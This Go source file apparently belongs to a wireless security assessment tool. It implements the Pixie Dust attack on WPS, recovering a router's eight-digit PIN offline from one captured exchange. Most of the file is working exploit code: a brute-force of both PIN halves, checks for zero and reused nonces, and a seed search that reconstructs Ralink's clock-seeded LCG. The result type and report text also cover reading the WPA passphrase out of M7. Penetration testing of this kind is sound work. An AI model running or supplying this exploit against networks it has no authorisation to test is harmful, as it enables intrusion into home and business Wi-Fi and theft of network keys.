package wps

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"
	"time"
)

// Pixie Dust: recovering the PIN offline from one WPS exchange.
//
// # The arithmetic
//
// M3 carries two commitments to the two halves of the PIN:
//
//	E-Hash1 = HMAC-AuthKey(E-S1 || PSK1 || PKE || PKR)
//	E-Hash2 = HMAC-AuthKey(E-S2 || PSK2 || PKE || PKR)
//
// AuthKey, PKE and PKR are all known - the public keys were exchanged in the clear and AuthKey
// falls out of the Diffie-Hellman. PSK1 and PSK2 are functions of the PIN halves, which is
// only 10^4 and 10^4 candidates. The one thing standing in the way is E-S1 and E-S2.
//
// So the whole attack is: guess how the access point generated those two nonces, and if the
// guess is right, brute-force the halves. First half: 10,000 candidates. Second half: 10,000,
// of which only 1,000 have a valid check digit. Both are instant.
//
// # The generators
//
// Three families cover the overwhelming majority of vulnerable hardware, and each is a
// different manufacturer's idea of a random number:
//
//   - **Zero.** E-S1 = E-S2 = 0. Ralink, MediaTek, and Realtek in many firmwares simply never
//     filled the buffer in. This is the single most common case in the field.
//   - **The enrollee nonce.** E-S1 = E-S2 = N1, the nonce the access point already sent in the
//     clear in M1. Broadcom and some Realtek builds derive all three from one call to the same
//     generator and end up reusing the value.
//   - **A seeded LCG.** Ralink's PRNG is `s = s * 1103515245 + 12345`, seeded from the clock,
//     drawing N1 then E-S1 then E-S2 in sequence. N1 is known, so the seed can be recovered by
//     searching a window of seconds around the exchange and E-S1/E-S2 follow deterministically.
//
// Anything that generated its nonces properly is not vulnerable, and that result is a **pass**
// for the client - it goes in the report as one, not as a failure of the tool.

// Observation is everything one WPS exchange yields, and everything the offline recovery
// needs. Nothing else from the exchange matters.
type Observation struct {
	// PKE and PKR are the enrollee's and registrar's 192-octet public keys.
	PKE []byte `json:"pke"`
	PKR []byte `json:"pkr"`
	// AuthKey is derived from the Diffie-Hellman exchange.
	AuthKey []byte `json:"authkey"`
	// EHash1 and EHash2 are the commitments from M3.
	EHash1 []byte `json:"ehash1"`
	EHash2 []byte `json:"ehash2"`
	// ENonce is the enrollee nonce from M1, in the clear.
	ENonce []byte `json:"enonce"`
	// At is when the exchange happened, which bounds the LCG seed search.
	At time.Time `json:"at"`
}

// Generator names how the access point produced its secret nonces.
type Generator string

// The recognised generators.
const (
	// GeneratorZero: E-S1 = E-S2 = 0.
	GeneratorZero Generator = "zero nonces"
	// GeneratorENonce: E-S1 = E-S2 = the enrollee nonce, which was sent in the clear.
	GeneratorENonce Generator = "secret nonces reused the public enrollee nonce"
	// GeneratorLCG: a linear congruential generator seeded from the clock.
	GeneratorLCG Generator = "clock-seeded linear congruential generator"
)

// Result is the outcome of an offline recovery attempt.
type Result struct {
	// Recovered reports whether the PIN was found.
	Recovered bool `json:"recovered"`
	// PIN is the eight-digit registration PIN, when Recovered.
	PIN string `json:"pin,omitempty"`
	// Generator names how the nonces were produced, when Recovered.
	Generator Generator `json:"generator,omitempty"`
	// ES1 and ES2 are the recovered secret nonces, kept as evidence: they are what makes the
	// finding demonstrable rather than asserted.
	ES1 []byte `json:"e_s1,omitempty"`
	ES2 []byte `json:"e_s2,omitempty"`
	// Seed is the recovered LCG seed, when the generator was one.
	Seed uint32 `json:"lcg_seed,omitempty"`
	// Elapsed is how long the recovery took.
	Elapsed time.Duration `json:"elapsed"`
	// Tried names the generators that were ruled out, so a negative result is reportable as
	// the pass it is rather than as an absence of information.
	Tried []Generator `json:"generators_ruled_out,omitempty"`
	// NetworkKey is the WPA passphrase, when the exchange went on to complete registration with
	// the recovered PIN and read the access point's own configuration out of M7. Empty when the
	// run stopped at M3 (no PIN, or M4→M7 did not complete).
	NetworkKey string `json:"network_key,omitempty"`
	// KeyESSID is the network name M7 reported alongside the key, for cross-checking.
	KeyESSID string `json:"key_essid,omitempty"`
}

// Describe renders the result for an operator and for a report.
func (r Result) Describe() string {
	if !r.Recovered {
		var b strings.Builder
		b.WriteString("PIN not recovered. The access point's WPS nonces were not produced by " +
			"any of the known weak generators")
		if len(r.Tried) > 0 {
			b.WriteString(" (ruled out: ")
			for i, g := range r.Tried {
				if i > 0 {
					b.WriteString("; ")
				}
				b.WriteString(string(g))
			}
			b.WriteString(")")
		}
		b.WriteString(". That is a pass for this device against Pixie Dust - WPS may still be " +
			"worth reporting as enabled, but it is not trivially recoverable here.")
		return b.String()
	}

	if r.NetworkKey != "" {
		return fmt.Sprintf(
			"WPS PIN %s recovered offline in %s (the access point's %s). WARP then completed the "+
				"registration with that PIN and read the access point's own configuration: the WPA "+
				"passphrase is %q. Neither expires, and no configuration was written to the access "+
				"point - the exchange stopped at M7 without sending M8.",
			r.PIN, r.Elapsed.Round(time.Millisecond), r.Generator, r.NetworkKey)
	}
	return fmt.Sprintf(
		"WPS PIN %s recovered offline in %s. The access point's %s, so its secret nonces were "+
			"predictable and the PIN halves fell to a 10,000-candidate search. The PIN yields "+
			"the WPA passphrase directly and does not expire.",
		r.PIN, r.Elapsed.Round(time.Millisecond), r.Generator)
}

// lcgSeedWindow is how far either side of the observation the seed search runs, in seconds.
//
// The seed is the access point's clock, which is not our clock: NTP drift, a box that has been
// up for months, and the gap between the exchange and the recovery all move it. Ten minutes
// each way is 1200 candidate seeds, which costs milliseconds, and covers real drift.
const lcgSeedWindow = 600

// Recover attempts the offline PIN recovery.
//
// It tries each known generator in turn, cheapest first, and returns as soon as one produces a
// PIN whose halves both verify against the observed hashes. Verifying against *both* hashes is
// what makes a hit certain rather than probable: a coincidental match on one 256-bit HMAC is
// already impossible, and matching two rules out any doubt.
func Recover(obs Observation) (Result, error) {
	start := time.Now()

	if err := obs.validate(); err != nil {
		return Result{}, err
	}

	zero := make([]byte, NonceLen)

	candidates := []struct {
		gen      Generator
		es1, es2 []byte
		seed     uint32
	}{
		{gen: GeneratorZero, es1: zero, es2: zero},
		{gen: GeneratorENonce, es1: obs.ENonce, es2: obs.ENonce},
	}

	var tried []Generator
	for _, c := range candidates {
		if pin, ok := solve(obs, c.es1, c.es2); ok {
			return Result{
				Recovered: true, PIN: pin, Generator: c.gen,
				ES1: c.es1, ES2: c.es2, Elapsed: time.Since(start),
			}, nil
		}
		tried = append(tried, c.gen)
	}

	// The LCG last: it is a search over seeds rather than a single guess, so it costs more
	// than the other two put together and there is no reason to pay for it first.
	if pin, es1, es2, seed, ok := solveLCG(obs); ok {
		return Result{
			Recovered: true, PIN: pin, Generator: GeneratorLCG,
			ES1: es1, ES2: es2, Seed: seed, Elapsed: time.Since(start),
		}, nil
	}
	tried = append(tried, GeneratorLCG)

	return Result{Elapsed: time.Since(start), Tried: tried}, nil
}

func (o Observation) validate() error {
	switch {
	case len(o.PKE) != dhKeyLen:
		return fmt.Errorf("wps: PKE is %d octets, expected %d", len(o.PKE), dhKeyLen)
	case len(o.PKR) != dhKeyLen:
		return fmt.Errorf("wps: PKR is %d octets, expected %d", len(o.PKR), dhKeyLen)
	case len(o.AuthKey) == 0:
		return fmt.Errorf("wps: no AuthKey")
	case len(o.EHash1) != 32 || len(o.EHash2) != 32:
		return fmt.Errorf("wps: E-Hash values must be 32 octets, got %d and %d",
			len(o.EHash1), len(o.EHash2))
	case len(o.ENonce) != NonceLen:
		return fmt.Errorf("wps: enrollee nonce is %d octets, expected %d",
			len(o.ENonce), NonceLen)
	}
	return nil
}

// solve brute-forces both PIN halves against a candidate pair of secret nonces.
func solve(obs Observation, es1, es2 []byte) (string, bool) {
	first, ok := solveFirstHalf(obs, es1)
	if !ok {
		return "", false
	}
	second, ok := solveSecondHalf(obs, es2, first)
	if !ok {
		// The first half matched, which is already conclusive about the nonces, but the second
		// did not. That means the two halves were generated differently - real on a handful of
		// firmwares - and it is worth nothing without both, so it is not a hit.
		return "", false
	}
	return first + second, true
}

// solveFirstHalf searches the 10,000 candidates for the PIN's first four digits.
func solveFirstHalf(obs Observation, es1 []byte) (string, bool) {
	for n := 0; n < 10000; n++ {
		half := fmt.Sprintf("%04d", n)
		psk := pskHalf(obs.AuthKey, half)
		if bytes.Equal(hashHalf(obs.AuthKey, es1, psk, obs.PKE, obs.PKR), obs.EHash1) {
			return half, true
		}
	}
	return "", false
}

// solveSecondHalf searches the second four digits.
//
// Only the 1,000 values with a valid check digit are tried: the last digit of a WPS PIN is a
// checksum over the first seven, so nine in ten candidates cannot be a real PIN. Skipping them
// is a tenfold saving for free.
func solveSecondHalf(obs Observation, es2 []byte, first string) (string, bool) {
	firstN := 0
	for _, r := range first {
		firstN = firstN*10 + int(r-'0')
	}

	for n := 0; n < 1000; n++ {
		// The seven-digit body is the first four digits followed by three more; the eighth
		// digit is determined by them.
		body := firstN*1000 + n
		half := fmt.Sprintf("%03d%d", n, PINChecksum(body))

		psk := pskHalf(obs.AuthKey, half)
		if bytes.Equal(hashHalf(obs.AuthKey, es2, psk, obs.PKE, obs.PKR), obs.EHash2) {
			return half, true
		}
	}
	return "", false
}

// lcgState is Ralink's generator: the textbook ANSI C rand().
type lcgState uint32

func (s *lcgState) next() uint32 {
	*s = lcgState(uint32(*s)*1103515245 + 12345)
	return uint32(*s)
}

// draw produces the next NonceLen octets, four bytes at a time, little-endian - which is how
// the firmware writes them into the buffer.
func (s *lcgState) draw() []byte {
	out := make([]byte, NonceLen)
	for i := 0; i < NonceLen; i += 4 {
		binary.LittleEndian.PutUint32(out[i:], s.next())
	}
	return out
}

// solveLCG recovers the generator's seed from the enrollee nonce, then derives the secret
// nonces that followed it.
//
// The seed is the access point's clock at the moment of the exchange. Ours is close but not
// equal, so a window either side is searched - and the enrollee nonce, which arrived in the
// clear in M1, is the oracle that says when the seed is right.
func solveLCG(obs Observation) (pin string, es1, es2 []byte, seed uint32, ok bool) {
	base := uint32(obs.At.Unix())
	if obs.At.IsZero() {
		base = uint32(time.Now().Unix())
	}

	for delta := 0; delta <= lcgSeedWindow; delta++ {
		// Outwards from the observation time in both directions: the true seed is far more
		// likely to be a few seconds off than ten minutes off, so a hit usually lands early.
		for _, candidate := range [2]uint32{base - uint32(delta), base + uint32(delta)} {
			s := lcgState(candidate)
			if !bytes.Equal(s.draw(), obs.ENonce) {
				continue
			}
			// The seed is confirmed by the public nonce. Everything after it is deterministic.
			gotES1, gotES2 := s.draw(), s.draw()
			if p, hit := solve(obs, gotES1, gotES2); hit {
				return p, gotES1, gotES2, candidate, true
			}
			// The seed produced the right public nonce but the wrong secret ones. That means
			// the firmware draws something else in between; keep searching rather than
			// concluding the device is safe.
		}
	}
	return "", nil, nil, 0, false
}
